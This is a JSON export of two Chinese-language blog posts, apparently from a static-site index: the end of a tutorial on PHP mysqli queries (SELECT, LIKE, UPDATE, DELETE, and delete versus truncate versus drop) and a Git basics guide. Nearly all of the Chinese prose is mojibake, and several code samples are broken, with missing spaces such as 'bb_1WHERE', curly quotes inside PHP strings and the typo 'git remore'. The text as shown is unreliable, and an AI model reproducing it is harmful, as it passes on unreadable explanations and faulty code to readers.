bb_1æ˜¯æ•°æ®è¡¨åã€‚ ä¸€å®šè¦æ³¨æ„æ‹¬å·ä¸€å¯¹ä¸€å¯¹çš„å†™ï¼Œä¸è¦å¿˜è®°htmlä»£ç çš„è¿ç»­æ€§ã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒPHP mysqli_fetch_array() å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¸º MYSQLI_ASSOCï¼Œè®¾ç½®è¯¥å‚æ•°æŸ¥è¯¢ç»“æœè¿”å›å…³è”æ•°ç»„ PHP æä¾›äº†å¦å¤–ä¸€ä¸ªå‡½æ•° mysqli_fetch_assoc(), è¯¥å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ã€‚è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„å…³è”æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œï¼Œåˆ™è¿”å› falseã€‚ åœ¨æˆ‘ä»¬æ‰§è¡Œå®Œ SELECT è¯­å¥åï¼Œé‡Šæ”¾æ¸¸æ ‡å†…å­˜æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¹ æƒ¯ã€‚ å¯ä»¥é€šè¿‡ PHP å‡½æ•° mysqli_free_result() æ¥å®ç°å†…å­˜çš„é‡Šæ”¾ã€‚ æ¸¸æ ‡å†…å­˜ï¼šå­˜å‚¨Selectçš„æŸ¥è¯¢ç»“æœï¼Œå¹¶ç”¨æ¥éå†ã€‚ æŸ¥è¯¢æ•°æ®1.2è¯­å¥ï¼š**$sql=â€™SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1 WHERE bb_id=â€2â€â€˜;** WHEREç›¸å½“äºä¸€ä¸ªé™åˆ¶æ¡ä»¶ã€‚æ¯”å¦‚è¿™é‡Œé¢çš„åªèƒ½æ˜¯id ä¸º2çš„æ•°æ®è¢«æŸ¥å‡ºæ¥ã€‚ æŸ¥è¯¢æ•°æ®1.3æ¨¡ç³ŠæŸ¥è¯¢ LIKEçš„ä½¿ç”¨ã€‚ è¯­å¥ï¼š $sql=â€™SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1WHERE bb_name LIKE â€œ%å­¦ä¹ â€â€˜; è¿˜æœ‰ä¸€äº›ç”¨æ³• â€˜%aâ€™ //ä»¥aç»“å°¾çš„æ•°æ® â€˜a%â€™ //ä»¥aå¼€å¤´çš„æ•°æ® â€˜%a%â€™ //å«æœ‰açš„æ•°æ® â€˜aâ€˜ //ä¸‰ä½ä¸”ä¸­é—´å­—æ¯æ˜¯açš„ â€˜_aâ€™ //ä¸¤ä½ä¸”ç»“å°¾å­—æ¯æ˜¯açš„ â€˜a_â€™ //ä¸¤ä½ä¸”å¼€å¤´å­—æ¯æ˜¯açš„ æŸ¥è¯¢æ•°æ®1.3è¯­å¥ï¼š $sql=â€™SELECT bb_id,bb_title,bb_name,bb_dataFROM bb_1ORDER BY bb_data ASCâ€™; æŒ‰ç…§æ—¶é—´çš„é¡ºåºæ’åºã€‚è¾“å‡ºã€‚ å…¶ä»–çš„å’Œæ•°æ®æµ‹è¯•çš„ä¸€æ ·ã€‚ ä¿®æ”¹æ•°æ®è¯­å¥ï¼š $sql=â€™UPDATE bb_1SET bb_name=â€è°å‘€â€WHERE bb_id=2â€™; WHEREæ˜¯ä¸€ä¸ªé™åˆ¶æ¡ä»¶ï¼› å¯ä»¥è¿™æ ·ç†è§£ï¼šupdate è¡¨åç§° set åˆ—åç§° = æ–°å€¼ where æ›´æ–°æ¡ä»¶; åˆ é™¤æ•°æ®è¯­å¥ï¼š $sql=â€™DELETE FROM bb_1WHERE bb_id=3â€™; deleteï¼Œdropï¼Œtruncate éƒ½æœ‰åˆ é™¤è¡¨çš„ä½œç”¨ï¼ŒåŒºåˆ«åœ¨äºï¼š 1ã€delete å’Œ truncate ä»…ä»…åˆ é™¤è¡¨æ•°æ®ï¼Œdrop è¿è¡¨æ•°æ®å’Œè¡¨ç»“æ„ä¸€èµ·åˆ é™¤ï¼Œæ‰“ä¸ªæ¯” æ–¹ï¼Œdelete æ˜¯å•æ€ï¼Œtruncate æ˜¯å›¢ç­ï¼Œdrop æ˜¯æŠŠç”µè„‘æ‘”äº†ã€‚ 2ã€delete æ˜¯ DML è¯­å¥ï¼Œæ“ä½œå®Œä»¥åå¦‚æœæ²¡æœ‰ä¸æƒ³æäº¤äº‹åŠ¡è¿˜å¯ä»¥å›æ»šï¼Œtruncate å’Œ drop æ˜¯ DDL è¯­å¥ï¼Œæ“ä½œå®Œé©¬ä¸Šç”Ÿæ•ˆï¼Œä¸èƒ½å›æ»šï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼Œdelete æ˜¯å‘å¾®ä¿¡è¯´åˆ†æ‰‹ï¼Œ åæ‚”è¿˜å¯ä»¥æ’¤å›ï¼Œtruncate å’Œ drop æ˜¯ç›´æ¥æ‰‡è€³å…‰è¯´æ»šï¼Œä¸èƒ½åæ‚”ã€‚ 3ã€æ‰§è¡Œçš„é€Ÿåº¦ä¸Šï¼Œdrop&gt;truncate&gt;deleteï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼Œdrop æ˜¯ç¥èˆŸç«ç®­ï¼Œtruncate æ˜¯å’Œè°å·åŠ¨è½¦ï¼Œdelete æ˜¯è‡ªè¡Œè½¦ã€‚ å¥½äº†ï¼Œåˆ°æ­¤ç»“æŸï¼Œæ„Ÿè°¢å¤§å®¶ã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/qq_37236745/article/details/78694768 å‚è€ƒï¼šèœé¸Ÿæ•™ç¨‹ã€‚","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"mysql","slug":"mysql","permalink":"https://yanmymickey.github.io/tags/mysql/"}]},{"title":"GitåŸºç¡€æ•™ç¨‹","date":"2018-11-19T16:00:00.000Z","path":"2018/11/20/Note/GitåŸºç¡€æ•™ç¨‹/","text":"GitåŸºç¡€æ•™ç¨‹Git æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œæœ€åˆç”±Linuxä¹‹çˆ¶Linus Torvaldsåˆ›ä½œï¼Œåæ‰˜ä»˜æ»¨é‡çº¯ä½œä¸ºè½¯ä»¶ç»´æŠ¤è€…ã€‚ è¯¦ç»†å†å²è§ç»´åŸº git wiki Gitçš„åŸºæœ¬åŠŸèƒ½ é¡¹ç›®ç®¡ç†åˆå§‹åŒ–é¡¹ç›®1git init åœ¨é¡¹ç›®æ ¹ç›®å½•å†…ä½¿ç”¨æ­¤å‘½ä»¤å³å°†é¡¹ç›®åˆå§‹åŒ–ä¸ºä¸€ä¸ªgitä»“åº“ ä¸‹è½½è¿œç¨‹é¡¹ç›®1git clone [option] URL [dirname] [dirname] è®¾ç½®æ–°å»ºç›®å½•çš„åå­— option: -b &lt;branch&gt; å…‹éš†æŒ‡å®šåˆ†æ”¯ æäº¤ä¿®æ”¹Git æœ‰ä¸€ä¸ªç”¨äºå­˜å‚¨ä¿®æ”¹çš„æš‚å­˜åŒºï¼Œæäº¤ä¸€æ¬¡ä¿®æ”¹çš„è¿‡ç¨‹é¦–å…ˆéœ€è¦æ·»åŠ æ–‡ä»¶åˆ°æš‚å­˜åŒºï¼Œç„¶åå†è¿›è¡Œæäº¤ï¼ˆcommitï¼‰ï¼Œå¹¶å¡«å†™æäº¤è®°å½• è·Ÿè¸ªæ–‡ä»¶ &amp;&amp; æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜åŒº1git add FILE FILE éœ€è¦æ·»åŠ åˆ°æš‚å­˜åŒºçš„æ–‡ä»¶ï¼Œä½¿ç”¨.æ¥æŒ‡ä»£å·¥ä½œåŒºå…¨éƒ¨æ–‡ä»¶ ç¬¬ä¸€æ¬¡æ·»åŠ çš„æ–‡ä»¶åœ¨ä¹‹å‰æ˜¯æœªè·Ÿè¸ªï¼ˆuntrackedï¼‰çš„çŠ¶æ€ï¼Œä½¿ç”¨å‘½ä»¤åä¼šè·Ÿè¸ªæ–‡ä»¶å¹¶å°†æ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒºï¼› å·²å­˜åœ¨ä½†æ˜¯å‘ç”Ÿäº†ä¿®æ”¹çš„æ–‡ä»¶ä¼šæ·»åŠ è¿›æš‚å­˜åŒºã€‚ æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€12git status # æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€git diff # æŸ¥çœ‹å·¥ä½œåŒºä¸æš‚å­˜åŒºçš„åŒºåˆ« git diffè‹¥æš‚å­˜åŒºæ— ä¿®æ”¹åˆ™æ˜¾ç¤ºä¸å½“å‰ç‰ˆæœ¬çš„åŒºåˆ«ï¼›ä¹Ÿå¯ä½¿ç”¨git diff --cachedæ¥æŸ¥çœ‹ã€‚ æäº¤æš‚å­˜åŒºåˆ°ç‰ˆæœ¬1git commit [options] options: -a æäº¤å…¨éƒ¨æœªæš‚å­˜çš„ä¿®æ”¹ -m MESSAGE ä½¿ç”¨çŸ­å­—ç¬¦ä¸²ä½œä¸ºæäº¤è®°å½•ï¼Œä¸é€‚ç”¨æ­¤å‚æ•°åˆ™ä¼šè¿›å…¥ç³»ç»Ÿç¼–è¾‘å™¨ç¼–å†™commitè®°å½• --amend é‡æ–°æäº¤æœ€è¿‘ä¸€æ¬¡çš„ä¿®æ”¹è®°å½• åˆ†æ”¯åˆ†æ”¯ç®¡ç†1git branch [options] [NAME] options: -a æ˜¾ç¤ºæ‰€æœ‰åˆ†æ”¯ï¼ˆæœ¬åœ°å’Œè¿œç¨‹ï¼‰ -d åˆ é™¤åˆ†æ”¯ï¼ˆå·²åˆå¹¶ï¼‰ -D å¼ºåˆ¶åˆ é™¤åˆ†æ”¯ -v æ˜¾ç¤ºæœ€è¿‘ä¸€æ¬¡æäº¤ æ£€å‡ºåˆ†æ”¯1git checkout [options] æ£€å‡ºåˆ°æŒ‡å®šåˆ†æ”¯ï¼ˆåˆ‡æ¢åˆ†æ”¯ï¼‰ï¼ŒåŒæ—¶ä¼šæ’¤é”€å½“å‰åˆ†æ”¯ä¸Šæœªæäº¤çš„æ‰€æœ‰ä¿®æ”¹ï¼ˆå›é€€åˆ°å½“å‰åˆ†æ”¯çš„æœ€æ–°ç‰ˆæœ¬ï¼‰ options: &lt;file&gt; æ’¤é”€æŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹ [branch_name] åˆ‡æ¢åˆ†æ”¯ -b [branch_name]æ–°å»ºå¹¶åˆ‡æ¢åˆ†æ”¯ -b [branchname] [tagname] åœ¨ç‰¹å®šæ ‡ç­¾ä¸‹åˆ›å»ºåˆ†æ”¯ å¯ä»¥ä½¿ç”¨checkoutæ¥å¿«é€Ÿæ’¤é”€å½“å‰åˆ†æ”¯æ‰€æœ‰ä¿®æ”¹ 1git checkout . åˆå¹¶åˆ†æ”¯1git merge NAME # å°†æŒ‡å®šåˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ å¸¸ç”¨åˆ†æ”¯åç§° master ä¸»åˆ†æ”¯ï¼Œç¨³å®šåˆ†æ”¯ï¼Œé»˜è®¤åˆ†æ”¯ dev å¼€å‘ç‰ˆæœ¬åˆ†æ”¯ fix#4 ä¿®å¤é—®é¢˜æ—¶çš„ä¸´æ—¶åˆ†æ”¯ æ ‡ç­¾Gitå¯ä»¥ç»™å†å²ä¸­çš„æŸä¸€ä¸ªæäº¤æ‰“ä¸Šæ ‡ç­¾ï¼Œä»¥ç¤ºé‡è¦ æ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„æ˜¯ç”¨æ¥æ ‡è®°å‘è¡¨ç»“ç‚¹ï¼ˆç‰ˆæœ¬å·ï¼‰ 123git tag # åˆ—å‡ºæ ‡ç­¾git tag -l &#39;pattern&#39; # ç”¨ç‰¹å®šæ¨¡å¼æŸ¥æ‰¾æ ‡ç­¾git show TAG # æŸ¥çœ‹æ ‡ç­¾ä¿¡æ¯ä¸å¯¹åº”çš„æäº¤ä¿¡æ¯ gitæ ‡ç­¾åˆ†ä¸ºè½»é‡æ ‡ç­¾å’Œé™„æ³¨æ ‡ç­¾ä¸¤ç§ è½»é‡æ ‡ç­¾åƒä¸€ä¸ªä¸ä¼šæ”¹å˜çš„åˆ†æ”¯ï¼ˆbranchï¼‰- å®ƒåªæ˜¯ä¸€ä¸ªç‰¹å®šæäº¤çš„å¼•ç”¨ã€‚ é™„æ³¨æ ‡ç­¾æ˜¯å­˜å‚¨åœ¨Gitæ•°æ®åº“ä¸­çš„ä¸€ä¸ªå®Œæ•´å¯¹è±¡ã€‚ å…¶ä¸­åŒ…å«ï¼š æ ‡ç­¾è€…çš„åå­— ç”µå­é‚®ä»¶åœ°å€ æ—¥æœŸæ—¶é—´ æ ‡ç­¾ä¿¡æ¯ å®ƒä»¬å¯ä»¥ä½¿ç”¨GPGç­¾åä¸éªŒè¯ é€šå¸¸å»ºè®®åˆ›å»ºé™„æ³¨æ ‡ç­¾ï¼ˆä¿¡æ¯é‡å¤§ï¼‰ï¼Œä½†å¦‚æœä½ åªæ˜¯æƒ³ç”¨ä¸€ä¸ªä¸´æ—¶çš„æ ‡ç­¾ï¼Œï¼Œæˆ–è€…å› ä¸ºæŸäº›åŸå› ä¸è¦ä¿å­˜é‚£äº›ä¿¡æ¯ï¼Œå°±ä½¿ç”¨è½»é‡æ ‡ç­¾ åˆ›å»ºæ ‡ç­¾git tag -a &lt;tagname&gt; -m &#39;comment&#39; åˆ›å»ºä¸€ä¸ªé™„æ³¨æ ‡ç­¾ -m é€‰é¡¹æŒ‡å®šäº†å°†ä¼šå­˜å‚¨åœ¨æ ‡ç­¾ä¸­çš„ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œgitå°†ä¼šè¿è¡Œç¼–è¾‘å™¨è¦æ±‚ä½ è¾“å…¥ä¿¡æ¯ git tag &lt;tagname&gt; åˆ›å»ºä¸€ä¸ªè½»é‡æ ‡ç­¾ ä¸éœ€è¦ä½¿ç”¨-aã€-sæˆ–-mé€‰é¡¹ï¼Œåªéœ€è¦æä¾›æ ‡ç­¾åå­— ä¸ºä¹‹å‰çš„æäº¤è¡¥å……æ ‡ç­¾ 1git tag -a &lt;tagname&gt; &lt;id&gt; idä¸ºè¦è¡¥å……æ ‡ç­¾çš„æäº¤çš„æ ¡éªŒå’Œï¼ˆæˆ–éƒ¨åˆ†æ ¡éªŒå’Œï¼‰ æ¨é€æ ‡ç­¾1git push &lt;remote&gt; &lt;tagname&gt; é»˜è®¤æƒ…å†µä¸‹ï¼Œgit pushå‘½ä»¤å¹¶ä¸ä¼šæ¨é€æ ‡ ç­¾åˆ°è¿œç¨‹ä»“åº“ã€‚åœ¨åˆ›å»ºå®Œæ ‡ç­¾åä½ å¿…é¡»æ˜¾å¼åœ°æ¨é€æ ‡ç­¾ï¼Œè¿‡ç¨‹å’Œæ¨é€è¿œç¨‹åˆ†æ”¯ä¸€æ · å¦‚æœæƒ³è¦ä¸€æ¬¡æ¨é€å¾ˆå¤šæ ‡ç­¾ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¸¦æœ‰--tagsé€‰é¡¹çš„git pushå‘½ä»¤ã€‚è¿™å°†ä¼šæŠŠæ‰€æœ‰ä¸åœ¨è¿œç¨‹ä»“åº“çš„æ ‡ç­¾å…¨éƒ¨æ¨é€åˆ°è¿œç¨‹ä»“åº“ æ£€å‡ºæ ‡ç­¾Git ä¸­å¹¶ä¸èƒ½çœŸçš„æ£€å‡ºä¸€ä¸ªæ ‡ç­¾ï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸èƒ½åƒåˆ†æ”¯ä¸€æ ·æ¥å›ç§»åŠ¨ã€‚å¦‚æœä½ æƒ³è¦å·¥ä½œç›®å½•ä¸ä»“åº“ä¸­ç‰¹å®šçš„æ ‡ç­¾ç‰ˆæœ¬å®Œå…¨ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨ 1git checkout -b &lt;branchname&gt; &lt;tagname&gt; è¿™å°†ä¼šåœ¨ç‰¹å®šçš„æ ‡ç­¾ä¸Šåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯ ä½†æ˜¯å¦‚æœåœ¨è¿™ä¸ªåˆ†æ”¯ä¸Šåˆè¿›è¡Œäº†æ–°æäº¤ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆ†æ”¯å°±ä¼šå› ä¸ºæ”¹åŠ¨è€Œå‘å‰ç§»åŠ¨å¯¼è‡´å’Œæ ‡ç­¾æœ‰æ‰€ä¸åŒã€‚ è¿œç¨‹ç®¡ç†è¿œç¨‹ä»“åº“1234git remore add origin URL # æ·»åŠ è¿œç¨‹ä»“åº“ä¸ºorigingit remote rm origin # åˆ é™¤è¿œç¨‹ä»“åº“origingit branch -r # æŸ¥çœ‹è¿œç¨‹ä»“åº“çš„åˆ†æ”¯ æ¨é€123git push origin dev:dev # å°†æœ¬åœ°devåˆ†æ”¯æ¨é€åˆ°origin&#x2F;devgit push REMOTE :BRANCH # å°†ç©ºåˆ†æ”¯æäº¤åˆ°è¿œç¨‹åˆ†æ”¯ï¼Œå³åˆ é™¤è¿œç¨‹åˆ†æ”¯git push --upstream origin master # ä½¿å½“å‰åˆ†æ”¯è·Ÿè¸ªè¿œç¨‹åˆ†æ”¯ æ‹‰å–1234git fetch origin master # æ‹‰å–è¿œç¨‹ä»“åº“originçš„masteråˆ†æ”¯å¹¶å­˜åˆ°åˆ†æ”¯origin&#x2F;masterä¸­git merge origin&#x2F;master # å°†æŒ‡å®šè¿œç¨‹åˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ä¸­git pull origin master # åˆå¹¶fetchä¸mergeä¸¤ä¸ªæ“ä½œ é…ç½®æ–‡ä»¶123git config --list # æŸ¥çœ‹é…ç½®æ–‡ä»¶git config --list --global #git config add é¡¹ç›®ç®¡ç†æµç¨‹ é¡¹ç›®æäº¤ åˆå§‹åŒ–/ä¸‹è½½é¡¹ç›® 12git initgit clone url åˆ›å»ºä¿®æ”¹ æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜ 1git add filename æäº¤æš‚å­˜ 1git commit -m &quot;log&quot; è¿œç¨‹åä½œ æ‹‰å– &amp; åˆå¹¶è¿œç¨‹åˆ†æ”¯ 1234git fetch origin master # origin&#x2F;mastergit merge origin&#x2F;mastergit pull origin master æ¨é€åˆ°è¿œç¨‹ä»“åº“ 1git push origin master åˆå¹¶æäº¤ &amp; å˜åŸº 12git fetch origin mastergit rebase origin&#x2F;master ç‰ˆæœ¬ç®¡ç† å¸¸é©»åˆ†æ”¯ master development * fix#1000 ä¸ºç‰ˆæœ¬æ‰“æ ‡ç­¾ ç‰ˆæœ¬å·è§„èŒƒ ä¼˜é›…çš„ä½¿ç”¨commit","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"git","slug":"git","permalink":"https://yanmymickey.github.io/tags/git/"}]}]